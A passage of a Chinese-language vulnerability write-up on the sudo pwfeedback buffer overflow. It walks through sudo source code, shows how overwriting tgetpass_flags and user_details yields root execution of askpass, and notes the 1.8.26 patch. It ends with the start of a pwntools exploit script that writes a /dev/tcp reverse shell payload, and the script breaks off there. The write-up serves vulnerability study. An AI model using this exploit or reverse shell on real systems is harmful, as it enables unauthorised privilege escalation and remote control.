    <span class="k">while</span> <span class="p">(</span><span class="o">--</span><span class="n">left</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">nr</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nr</span> <span class="o">!=</span> <span class="mi">1</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">||</span> <span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;\r&#39;</span><span class="p">)</span>
	    <span class="k">break</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">feedback</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_kill</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">while</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_erase</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
				<span class="n">left</span><span class="o">++</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="n">ignore_result</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;*&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
	<span class="p">}</span>
	<span class="o">*</span><span class="n">cp</span><span class="o">++</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">......</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>如果sudo开启了pwfeedback,之后进行两个判断</p>
<pre><code>sudo_term_kill: 删除所有字符,可输入字符数量left重新赋值为bufsiz
sudo_term_erase:删除单个字符,可输入字符数量left自增1
</code></pre>
<p>漏洞点</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">feedback</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_kill</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">while</span> <span class="p">(</span><span class="n">cp</span> <span class="o">&gt;</span> <span class="n">buf</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\b</span><span class="s"> </span><span class="se">\b</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
					<span class="k">break</span><span class="p">;</span>
				<span class="o">--</span><span class="n">cp</span><span class="p">;</span>
			<span class="p">}</span>
			<span class="n">left</span> <span class="o">=</span> <span class="n">bufsiz</span><span class="p">;</span>
			<span class="k">continue</span><span class="p">;</span>
	    <span class="p">}</span>
	    <span class="p">......</span>
</code></pre></td></tr></table>
</div>
</div><p>若从管道读取数据,因为管道是单向的,那么<code>write(fd, &quot;\b \b&quot;, 3) == -1</code>总是成立,break跳出while循环,令变量<code>left</code>重新赋值为<code>bufsiz</code></p>
<p>因为变量<code>left</code>重新赋值为<code>bufsiz</code>,所以while循环继续运行,故此处可以继续拷贝数据,而此处拷贝到的<code>buf</code>指针是一个BSS段上的变量</p>
<p>而在BSS段上,buf指针后存在<code>askpass_6192、signo、tgetpass_flags、user_details_0</code>等多个BSS上的变量</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
</span><span class="cm"> * Like getpass(3) but with timeout and echo flags.
</span><span class="cm"> */</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">tgetpass</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">prompt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">timeout</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span><span class="k">struct</span> <span class="n">sudo_conv_callback</span> <span class="o">*</span><span class="n">callback</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">,</span> <span class="n">savealrm</span><span class="p">,</span> <span class="n">saveint</span><span class="p">,</span> <span class="n">savehup</span><span class="p">,</span> <span class="n">savequit</span><span class="p">,</span> <span class="n">saveterm</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">savetstp</span><span class="p">,</span> <span class="n">savettin</span><span class="p">,</span> <span class="n">savettou</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">pass</span><span class="p">;</span>
    <span class="k">static</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">askpass</span><span class="p">;</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SUDO_CONV_REPL_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">save_errno</span><span class="p">,</span> <span class="n">neednl</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">need_restart</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">tgetpass</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
		<span class="n">askpass</span> <span class="o">=</span> <span class="n">getenv_unhooked</span><span class="p">(</span><span class="s">&#34;SUDO_ASKPASS&#34;</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">*</span><span class="n">askpass</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
			<span class="n">askpass</span> <span class="o">=</span> <span class="n">sudo_conf_askpass_path</span><span class="p">();</span>  <span class="c1">//get the askpass from the environment
</span><span class="c1"></span>    <span class="p">}</span>

    <span class="cm">/* If no tty present and we need to disable echo, try askpass. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_STDIN</span><span class="o">|</span><span class="n">TGP_ECHO</span><span class="o">|</span><span class="n">TGP_ASKPASS</span><span class="o">|</span><span class="n">TGP_NOECHO_TRY</span><span class="p">)</span> <span class="o">&amp;&amp;!</span><span class="n">tty_present</span><span class="p">())</span>
    <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="n">getenv_unhooked</span><span class="p">(</span><span class="s">&#34;DISPLAY&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">sudo_warnx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;no tty present and no askpass program specified&#34;</span><span class="p">));</span>
			<span class="n">debug_return_str</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="n">SET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_ASKPASS</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="cm">/* If using a helper program to get the password, run it instead. */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_ASKPASS</span><span class="p">))</span>
    <span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">askpass</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">||</span> <span class="o">*</span><span class="n">askpass</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span>
			<span class="n">sudo_fatalx</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;no askpass program specified, try setting SUDO_ASKPASS&#34;</span><span class="p">));</span>
		<span class="n">debug_return_str_masked</span><span class="p">(</span><span class="n">sudo_askpass</span><span class="p">(</span><span class="n">askpass</span><span class="p">,</span> <span class="n">prompt</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="c1">//.......
</span><span class="c1"></span>    <span class="n">pass</span> <span class="o">=</span> <span class="n">getln</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">ISSET</span><span class="p">(</span><span class="n">flags</span><span class="p">,</span> <span class="n">TGP_MASK</span><span class="p">));</span>
    <span class="c1">//......
</span><span class="c1"></span><span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>因为第一次<code>tgetpass_flags</code>没有开启<code>TGP_ASKPASS</code>,那么会通过后面的<code>getln(input, buf, sizeof(buf), ISSET(flags, TGP_MASK));</code>进行写入,此时开启了feedback选项,可以形成越界修改<code>tgetpass_flags</code>变量的值</p>
<p>又因为sudo会有三次输入的机会,如果令<code>tgetpass_flags</code>开启<code>TGP_ASKPASS</code>选项</p>
<p>其中<code>tgetpass_flags</code>的各标志位值位于sudo.h</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#define TGP_NOECHO  0x00        </span><span class="cm">/* turn echo off reading pw (default) */</span><span class="cp">
</span><span class="cp">#define TGP_ECHO    0x01        </span><span class="cm">/* leave echo on when reading passwd */</span><span class="cp">
</span><span class="cp">#define TGP_STDIN   0x02        </span><span class="cm">/* read from stdin, not /dev/tty */</span><span class="cp">
</span><span class="cp">#define TGP_ASKPASS 0x04        </span><span class="cm">/* read from askpass helper program */</span><span class="cp">
</span><span class="cp">#define TGP_MASK    0x08        </span><span class="cm">/* mask user input when reading */</span><span class="cp">
</span><span class="cp">#define TGP_NOECHO_TRY  0x10        </span><span class="cm">/* turn off echo if possible */</span><span class="cp">
</span></code></pre></td></tr></table>
</div>
</div><p>继而第二次输入密码则调用<code>sudo_askpass</code>函数,继续查看<code>sudo_askpass</code>函数源码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="cm">/*
</span><span class="cm"> * Fork a child and exec sudo-askpass to get the password from the user.
</span><span class="cm"> */</span>
<span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="nf">sudo_askpass</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">askpass</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">prompt</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">SUDO_CONV_REPL_MAX</span> <span class="o">+</span> <span class="mi">1</span><span class="p">],</span> <span class="o">*</span><span class="n">pass</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">,</span> <span class="n">savechld</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pfd</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">child</span><span class="p">;</span>
    <span class="n">debug_decl</span><span class="p">(</span><span class="n">sudo_askpass</span><span class="p">,</span> <span class="n">SUDO_DEBUG_CONV</span><span class="p">)</span>

    <span class="cm">/* Set SIGCHLD handler to default since we call waitpid() below. */</span>
    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sa</span><span class="p">));</span>
    <span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
    <span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">SIG_DFL</span><span class="p">;</span>
    <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">savechld</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">pfd</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">sudo_fatal</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to create pipe&#34;</span><span class="p">));</span>

    <span class="n">child</span> <span class="o">=</span> <span class="n">sudo_debug_fork</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="n">sudo_fatal</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to fork&#34;</span><span class="p">));</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
	<span class="cm">/* child, point stdout to output side of the pipe and exec askpass */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">dup2</span><span class="p">(</span><span class="n">pfd</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">STDOUT_FILENO</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="s">&#34;dup2&#34;</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="n">ROOT_UID</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="s">&#34;setuid(%d)&#34;</span><span class="p">,</span> <span class="n">ROOT_UID</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setgid</span><span class="p">(</span><span class="n">user_details</span><span class="p">.</span><span class="n">gid</span><span class="p">))</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to set gid to %u&#34;</span><span class="p">),</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">user_details</span><span class="p">.</span><span class="n">gid</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">setuid</span><span class="p">(</span><span class="n">user_details</span><span class="p">.</span><span class="n">uid</span><span class="p">))</span> <span class="p">{</span>
	    <span class="n">sudo_warn</span><span class="p">(</span><span class="n">U_</span><span class="p">(</span><span class="s">&#34;unable to set uid to %u&#34;</span><span class="p">),</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">user_details</span><span class="p">.</span><span class="n">uid</span><span class="p">);</span>
	    <span class="n">_exit</span><span class="p">(</span><span class="mi">255</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">closefrom</span><span class="p">(</span><span class="n">STDERR_FILENO</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
	<span class="n">execl</span><span class="p">(</span><span class="n">askpass</span><span class="p">,</span> <span class="n">askpass</span><span class="p">,</span> <span class="n">prompt</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nb">NULL</span><span class="p">);</span> <span class="c1">//执行程序
</span><span class="c1"></span>	<span class="p">......</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>最开始有<code>child = sudo_debug_fork()</code>;此处程序fork了一个子线程,而子线程的权限来自于<code>user_details</code>即之前可以越界修改的<code>user_details_0</code>的数据</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">user_details</span> <span class="p">{</span>
    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">ppid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">pgid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">tcpgid</span><span class="p">;</span>
    <span class="n">pid_t</span> <span class="n">sid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">euid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">gid</span><span class="p">;</span>
    <span class="n">uid_t</span> <span class="n">egid</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">cwd</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">tty</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">host</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shell</span><span class="p">;</span>
    <span class="n">GETGROUPS_T</span> <span class="o">*</span><span class="n">groups</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ngroups</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ts_cols</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">ts_lines</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></td></tr></table>
</div>
</div><p><code>user_details</code>结构体包括了进程的UID以及PID,若将其置0,则子进程变为root权限,之后会以root权限<code>execl(askpass, askpass, prompt, (char *)NULL);</code>执行askpass指向的文件</p>
<h4 id="知识点">知识点</h4>
<ol>
<li>sudo输入具有三次输入的机会</li>
<li>如果开启了pwfeedback,程序会利用tgetpass函数中的getln函数进行输入,而getln函数在pwfeedback开启时存在BSS数据越界</li>
<li>在sudo_askpass函数中,会fork一个子线程,以子线程的权限运行一个askpass指向的程序</li>
</ol>
<h4 id="思路总结-1">思路总结</h4>
<ol>
<li>第一次输入修改<code>tgetpass_flags |= TGP_ASKPASS</code>,然后继续溢出修改<code>user_details_0</code>为root权限</li>
<li>第二次就会检测到存在<code>TGP_ASKPASS</code>从而调用<code>sudo_askpass</code>函数,进而执行<code>askpass指针</code>指向的文件</li>
<li>最终通过反弹shell的方式拿到shell</li>
</ol>
<h4 id="patch-in-1826">Patch in 1.8.26</h4>
<p>在1.8.26之后的getln中添加了对EOF的处理</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp">        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="o">==</span> <span class="n">sudo_term_eof</span><span class="p">)</span> <span class="p">{</span>
		    <span class="n">nr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
		    <span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>如此POC1不起作用了,但是若创建一个新的伪终端对,从伪终端获取输入流<br>
在ASCII中,EOF与KILL对应的值分别为0x04与0x15,则稍微修改一个POC漏洞就可以再次利用</p>
<h4 id="exploit脚本">Exploit脚本</h4>
<p>如果通过管道传输数据,<code>sudo_term_kill</code>初始化为<code>\x00</code>,将会导致溢出到user_details_0之前,signo不能置0,否则会抛出异常从而KILL进程</p>
<p>而通过终端传输数据,<code>sudo_term_kill</code>是为<code>\x15</code>的,则优选pty作为输入方式</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf-8</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span><span class="nn">os</span>

<span class="n">TARGET</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="s2">&#34;/tmp/build/bin/sudo&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">setFlags</span><span class="p">(</span><span class="n">flags</span><span class="p">):</span>
	<span class="n">tgetpassFlags</span> <span class="o">=</span> <span class="p">{</span>
		<span class="s2">&#34;TGP_NOECHO&#34;</span><span class="p">:</span><span class="mh">0x00</span><span class="p">,</span>
		<span class="s2">&#34;TGP_ECHO&#34;</span><span class="p">:</span><span class="mh">0x01</span><span class="p">,</span>
		<span class="s2">&#34;TGP_STDIN&#34;</span><span class="p">:</span><span class="mh">0x02</span><span class="p">,</span>
		<span class="s2">&#34;TGP_ASKPASS&#34;</span><span class="p">:</span><span class="mh">0x04</span><span class="p">,</span>
		<span class="s2">&#34;TGP_MASK&#34;</span><span class="p">:</span><span class="mh">0x08</span><span class="p">,</span>
		<span class="s2">&#34;TGP_NOECHO_TRY&#34;</span><span class="p">:</span><span class="mh">0x10</span>
	<span class="p">}</span>
	<span class="n">flags</span> <span class="o">=</span> <span class="n">flags</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;|&#34;</span><span class="p">)</span>
	<span class="n">retval</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">flags</span><span class="p">:</span>
		<span class="n">retval</span> <span class="o">|=</span> <span class="n">tgetpassFlags</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
	<span class="k">return</span> <span class="n">retval</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>

	<span class="n">shell_path</span> <span class="o">=</span> <span class="s2">&#34;/tmp/root.sh&#34;</span>
	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">shell_path</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
		<span class="nb">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span>
		<span class="s1">&#39;&#39;&#39;#!/bin/bash
</span><span class="s1">		bash -c &#34;bash -i &gt;&amp; /dev/tcp/127.0.0.1/3000 0&gt;&amp;1&#34;
</span><span class="s1">		&#39;&#39;&#39;</span><span class="p">)</span>
